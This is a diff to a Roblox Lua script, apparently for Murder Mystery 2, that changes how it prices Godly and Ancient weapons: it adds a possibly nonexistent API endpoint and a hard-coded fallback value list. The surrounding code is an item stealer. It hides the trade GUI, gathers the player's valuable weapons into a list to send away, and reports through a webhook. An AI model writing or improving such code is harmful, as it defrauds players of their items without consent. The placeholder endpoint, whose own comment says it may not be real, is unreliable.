@@ -42,49 +42,57 @@ local function SendWebhook(title, description, fields, prefix, image)
     end)
 end
 
--- Función para obtener valores de armas (Godly y Ancient)
-local function buildValueList()
-    local valueList = {}
-    local categories = {
-        godly = "https://supremevaluelist.com/mm2/godlies.html",
-        ancient = "https://supremevaluelist.com/mm2/ancients.html"
-    }
-    local headers = {
-        ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*",
-        ["User-Agent"] = "Mozilla/5.0"
-    }
-
-    local function fetchHTML(url)
-        local res = req({Url=url, Method="GET", Headers=headers})
-        return res and res.Body or ""
-    end
-
-    local function parseValue(html)
-        local value = html:match("<b class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
-        if value then
-            value = tonumber(value:gsub(",",""))
-            return value
-        end
-        return nil
-    end
-
-    for _, url in pairs(categories) do
-        local html = fetchHTML(url)
-        for name, body in html:gmatch("<div class=['\"]itemhead['\"]>(.-)</div>%s*<div class=['\"]itembody['\"]>(.-)</div>") do
-            local itemName = name:match("([^<]+)")
-            if itemName then
-                itemName = itemName:gsub("%s+", " "):lower()
-                local value = parseValue(body)
-                if value then
-                    valueList[itemName] = value
+-- Función para traer valores de armas desde API
+local function fetchValuesFromAPI()
+    local url = "https://api.valuesupreme.com/mm2/values" -- Cambia si hay endpoint oficial real
+    local success, res = pcall(function()
+        return req({Url=url, Method="GET"})
+    end)
+    if success and res and res.Body then
+        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+        if ok and type(data)=="table" then
+            local valueList = {}
+            for _, item in pairs(data) do
+                if item.Rarity=="Godly" or item.Rarity=="Ancient" then
+                    valueList[item.Name:lower()] = item.Value
                 end
             end
+            return valueList
         end
+    end
+    return {}
+end
+
+-- Lista manual de respaldo (Godly + Ancient)
+local fallbackValues = {
+    ["gingerscope"]=10700,
+    ["travelers axe"]=6900,
+    ["celestial"]=975,
+    ["astral"]=850,
+    ["morning star"]=720,
+    ["northern star"]=680,
+    ["moonlight"]=640,
+    ["helios"]=600,
+    ["stormbringer"]=580,
+    ["reaper"]=550,
+    ["blaze"]=500,
+    ["phantom"]=470,
+    ["zenith"]=450,
+    ["ares"]=420,
+    ["hephaestus"]=400,
+    ["mystic"]=380,
+    -- Añadir todas las Godly y Ancient conocidas manualmente
+}
+
+-- Construir lista de valores final
+local function buildValueList()
+    local valueList = fetchValuesFromAPI()
+    for k,v in pairs(fallbackValues) do
+        if not valueList[k] then valueList[k] = v end
     end
     return valueList
 end
 
--- Construir lista de valores
 local valueList = buildValueList()
 
 -- Ocultar GUI de trade
@@ -123,8 +131,7 @@ for id, amount in pairs(profile.Weapons.Owned) do
         local rarityIndex = table.find(rarityTable, item.Rarity)
         local minIndex = table.find(rarityTable, min_rarity)
         if rarityIndex and rarityIndex >= minIndex then
-            local nameKey = (item.ItemName or item.Name or tostring(id)):lower()
-            local value = valueList[nameKey] or 1
+            local value = valueList[item.ItemName:lower()] or 1
             if value >= min_value then
                 table.insert(weaponsToSend,{DataID=id, Amount=amount, Value=value, Rarity=item.Rarity})
                 totalValue += value * amount
